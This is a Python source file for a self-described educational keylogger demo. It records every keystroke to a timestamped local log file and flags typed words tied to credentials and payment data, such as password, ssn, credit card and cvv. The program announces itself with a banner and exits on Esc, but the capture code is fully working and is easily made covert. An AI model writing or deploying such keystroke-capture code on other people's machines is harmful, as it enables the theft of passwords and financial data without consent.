import pynput
from pynput.keyboard import Key, Listener
import logging
import datetime
import os
from colorama import init, Fore, Style

# Initialize colorama for cross-platform colored terminal output
init()

# Create logs directory if it doesn't exist
if not os.path.exists('logs'):
    os.makedirs('logs')

# Configure logging
log_file = f"logs/keylog_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
logging.basicConfig(filename=log_file, level=logging.INFO, 
                    format='%(asctime)s: %(message)s')

# Suspicious patterns to detect (for educational purposes)
suspicious_patterns = [
    'password', 'pass', 'pwd', 'username', 'login', 'ssn', 'social', 
    'credit', 'card', 'cvv', 'expiry', 'bank', 'account'
]

# Buffer to store recent keystrokes for pattern detection
key_buffer = []
MAX_BUFFER_SIZE = 20

print(f"{Fore.CYAN}╔══════════════════════════════════════════╗{Style.RESET_ALL}")
print(f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.YELLOW}Educational Keylogger Demo{Style.RESET_ALL}              {Fore.CYAN}║{Style.RESET_ALL}")
print(f"{Fore.CYAN}║{Style.RESET_ALL} {Fore.RED}FOR EDUCATIONAL PURPOSES ONLY{Style.RESET_ALL}         {Fore.CYAN}║{Style.RESET_ALL}")
print(f"{Fore.CYAN}╠══════════════════════════════════════════╣{Style.RESET_ALL}")
print(f"{Fore.CYAN}║{Style.RESET_ALL} Logging to: {Fore.GREEN}{log_file}{Style.RESET_ALL}   {Fore.CYAN}║{Style.RESET_ALL}")
print(f"{Fore.CYAN}║{Style.RESET_ALL} Press {Fore.RED}Esc{Style.RESET_ALL} to exit                        {Fore.CYAN}║{Style.RESET_ALL}")
print(f"{Fore.CYAN}╚══════════════════════════════════════════╝{Style.RESET_ALL}")

def check_for_suspicious_patterns(buffer):
    # Join the buffer into a string
    buffer_text = ''.join(buffer).lower()
    
    # Check for each suspicious pattern
    for pattern in suspicious_patterns:
        if pattern in buffer_text:
            print(f"{Fore.RED}[ALERT] Suspicious pattern detected: {pattern}{Style.RESET_ALL}")
            logging.warning(f"Suspicious pattern detected: {pattern}")
            return True
    return False

def on_press(key):
    try:
        # Get the character representation of the key
        key_char = key.char
        
        # Log the key press
        logging.info(f"Key pressed: {key_char}")
        print(f"{Fore.GREEN}Key pressed: {key_char}{Style.RESET_ALL}")
        
        # Add to buffer for pattern detection
        key_buffer.append(key_char)
        
    except AttributeError:
        # Special keys don't have a char attribute
        key_name = str(key).replace("Key.", "")
        logging.info(f"Special key pressed: {key_name}")
        print(f"{Fore.BLUE}Special key pressed: {key_name}{Style.RESET_ALL}")
        
        # Add a representation of special keys to buffer
        if key == Key.space:
            key_buffer.append(' ')
        elif key == Key.enter:
            key_buffer.append('\n')
        elif key == Key.tab:
            key_buffer.append('\t')
        elif key == Key.backspace:
            if key_buffer:  # If buffer is not empty
                key_buffer.pop()
    
    # Keep buffer size limited
    while len(key_buffer) > MAX_BUFFER_SIZE:
        key_buffer.pop(0)
    
    # Check for suspicious patterns
    check_for_suspicious_patterns(key_buffer)
    
    # Exit on Esc key
    if key == Key.esc:
        print(f"{Fore.YELLOW}Keylogger stopped.{Style.RESET_ALL}")
        return False

def on_release(key):
    # You can add additional functionality here if needed
    pass

# Set up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    try:
        listener.join()
    except Exception as e:
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
        logging.error(f"Error: {e}")

print(f"{Fore.YELLOW}Keylogger session ended. Logs saved to {log_file}{Style.RESET_ALL}")